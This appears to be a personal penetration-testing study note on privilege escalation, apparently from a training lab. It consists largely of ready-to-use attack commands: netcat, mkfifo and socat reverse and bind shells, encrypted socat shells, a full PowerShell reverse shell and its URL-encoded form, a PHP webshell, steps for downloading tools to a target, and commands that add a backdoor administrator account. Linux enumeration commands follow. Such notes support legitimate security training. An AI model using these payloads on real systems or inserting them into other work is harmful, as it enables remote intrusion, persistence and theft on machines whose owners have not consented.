# Privilege Escalation

## Shell  
- [Reverse Shell Cheat Sheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- `/usr/share/webshells`: Pre-installed webshells on kali  

### Types of Shell
- Reverse shells are when the target is forced to execute code that connects back to your computer.
- Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target.  

### Netcat  
*Reverse Shells*  
`nc -lvnp <port-number>`: starting a netcat listener  
`-l` is used to tell netcat that this will be a listener  
`-v` is used to request a verbose output  
`-n` tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.  
`-p` indicates that the port specification will follow.  
Be aware that if you choose to use a port below 1024, you will need to use `sudo` when starting your listener.   
<br>

*Blind Shells*  
`nc <target-ip> <chosen-port>`: make an outbound connection to connect a
netcat listener  

#### Netcat Shell Stabilization
*Technique 1: Python*  
1. `python -c 'import pty;pty.spawn("/bin/bash")'`  
    note that some targets may need the version of Python specified.   
2. `export TERM=xterm` -- this will give us access to term commands such as `clear`  
3.  Background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.   
    <img src="https://user-images.githubusercontent.com/73976100/222940244-bb418620-8fc6-4f51-ab5a-27e8dfbdbab4.png" width="600">  
Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.  

*Technique 2: rlwrap*  
    rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.  
    `sudo apt install rlwrap`  
    `rlwrap nc -lvnp <port>`  
    When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell.  

*Technique 3: Socat*  
    The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).  
    For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.  

`stty -a`: Change the terminal tty size  
<img src="https://user-images.githubusercontent.com/73976100/222940820-00bf8238-f60a-4d4f-afe9-d794fd46fc42.png" width="600">  
`stty rows <number>`  
`stty cols <number>`

### Socat
*Reverse Shells*  
`socat TCP-L:<port> -`:  this is taking two points (a listening port, and standard input) and connecting them together.  
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`: On Windows command to connect back  
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`: On Linux  

*Bind Shells*  
`socat TCP-L:<PORT> EXEC:"bash -li"`: On a Linux target  
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`: On a Windows target  
`socat TCP:<TARGET-IP>:<TARGET-PORT> -`:  On an attacking machine  

*a fully stable Linux tty reverse shell*
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
<img src="https://user-images.githubusercontent.com/73976100/222942912-2b022e20-e9f5-4b14-b888-465bcee32fad.png">  
left: listener running on our local attacking machine  
right: compromised target  
<details>

- pty, allocates a pseudoterminal on the target -- part of the stabilisation process
- stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
- sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- setsid, creates the process in a new session
- sane, stabilises the terminal, attempting to "normalise" it.
</details>

### Socat Encrypted Shells  
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`: generate a certificate (on an attacking machine is easy)  
`cat shell.key shell.crt > shell.pem`: merge the two created files into a single `.pem` file  
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`: set up a reverse shell listener  
`verify=0`: not bother trying to validate  
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`: connect back  
Bind shell  
Target:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  
Attacker:
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`  
<details>
<img src="https://user-images.githubusercontent.com/73976100/222943648-ca52adef-2048-4429-b36b-6c8b3942cba3.png">  
</details>

### Common Shell Payloads  
`nc.exe`: `/usr/share/windows-resources/binaries` in Kali     
`nc -lvnp <PORT> -e /bin/bash`  
`nc <LOCAL-IP> <PORT> -e /bin/bash `  
bind shell: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`  
reverse shell: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`  
Powershell reverse shell:  
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```  
<img src="https://user-images.githubusercontent.com/73976100/222944957-405871af-45c6-45aa-b8d7-e53fa21ee8d5.png">  

### WebShells
"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server.   

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`  
This will take a GET parameter in the URL and execute it on the system with shell_exec().  
<img src="https://user-images.githubusercontent.com/73976100/222945750-dac50e93-affe-4e85-96b6-c223ae5689d4.png" width="600">  

[PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)  
`/usr/share/webshells/php/php-reverse-shell.php`: in kali  

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the `cmd` argument:  
```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

### Next Steps  
On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.  
<br>

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`. These can be MD5 hashes or in plaintext, depending on the version.  
Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges.  
`net user <username> <password> /add`  
`net localgroup administrators <username> /add`  

## Linux Privilege Escalation
### Enumeration
- `hostname`: return the hostname of the target machine  
- `uname -a`: print system more information about the kernel
- `/proc/version`: provides information about the target system processes
- `/etc/issue`: contains some information about the operating system  
- `ps`: see the running processes  
    - PID: The process ID (unique to the process)
    - TTY: Terminal type used by the user
    - Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
    - CMD: The command or executable running (will NOT display any command line parameter)  
    - `ps -A`: view all running processes
    - `ps axjf`: view process tree 
    - `ps aux`: show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x)  
- `env`: show environmental variables  
    <img src="https://user-images.githubusercontent.com/73976100/223572360-ab79bd05-32e8-44dd-9d58-049bf06be043.png" width="600">  
- `sudo -l`: list all commands user can run using `sudo`  
- `ls`: `ls -als`  
- `id`: provide a general overview of the user’s privilege level and group memberships  
- `/etc/passwd`: an easy way to discover users on the system  
    <img src="https://user-images.githubusercontent.com/73976100/223573778-7e2a8118-3445-468f-b1b6-f661f6c7c548.png" width="400">  
    Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.  
    `cat /etc/passwd | grep home`  
- `history`: Looking at earlier commands  
- `ifconfig`: information about the network interfaces of the system  
- `ip route`: see which network routes exist  
- `netstat`: check for existing interfaces and network routes  
    - `netstat -a`: shows all listening ports and established connections.
    - `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
    - `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
    - `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.
    - `netstat -ltp`: list connections with the service name and PID information.
    - `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.
    - `netstat -ano`: `-a`:Display all sockets, `-n`: Do not resolve names, `-o`: Display timers  
- `find` Command
    - `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
    - `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
    - `find / -type d -name config`: find the directory named config under “/”
    - `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
    - `find / -perm a=x`: find executable files
    - `find /home -user frank`: find all files for user “frank” under “/home”
    - `find / -mtime 10`: find files that were modified in the last 10 days
    - `find / -atime 10`: find files that were accessed in the last 10 day
    - `find / -cmin -60`: find files changed within the last hour (60 minutes)
    - `find / -amin -60`: find files accesses within the last hour (60 minutes)
    - `find / -size 50M`: find files with a 50 MB size  
    It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output.  
    Folders and files that can be written to or executed from:
    - `find / -writable -type d 2>/dev/null`: Find world-writeable folders
    - `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
    - `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
    - `find / -perm -o x -type d 2>/dev/null`: Find world-executable folders
    Find development tools and supported languages:
    - `find / -name perl*`
    - `find / -name python*`
    - `find / -name gcc*`  
    The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it.
    - `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit.

### Automated Enumeration Tools
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker




